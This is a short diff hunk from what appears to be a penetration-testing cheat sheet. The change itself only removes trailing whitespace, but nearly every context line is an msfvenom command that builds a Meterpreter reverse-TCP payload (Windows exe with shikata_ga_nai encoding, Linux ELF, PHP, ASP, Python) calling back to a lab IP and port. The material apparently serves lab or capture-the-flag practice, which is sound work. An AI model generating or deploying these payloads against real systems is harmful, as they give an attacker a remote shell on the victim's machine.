@@ -6,16 +6,16 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 
 
 # elf:
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
- 
+
 # Windows:
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
 
 # PHP:
 msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
- 
+
 # ASP:
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
- 
+
 # Python:
 msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.4 LPORT=443 > pyterpreter.py
 
